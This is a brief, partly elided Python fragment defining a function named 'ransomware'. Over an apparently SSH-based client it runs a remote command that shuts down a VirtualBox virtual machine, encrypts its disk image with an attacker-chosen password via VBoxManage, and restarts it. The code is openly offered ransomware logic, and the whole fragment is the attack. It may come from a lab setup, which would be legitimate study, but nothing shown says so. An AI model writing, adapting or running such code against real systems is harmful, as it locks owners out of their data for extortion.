...
def ransomware(hostname, username, password, diskPath, passFile):
	...
	try:
		...
		stdin, stdout, stderr = client.exec_command('VBoxManage controlvm "debian-file" poweroff && VBoxManage encryptmedium "' + diskPath + '" --newpassword "' + passFile + '" --cipher "AES-XTS128-PLAIN64" --newpasswordid "id" && VBoxManage startvm "debian-file"')
		return True
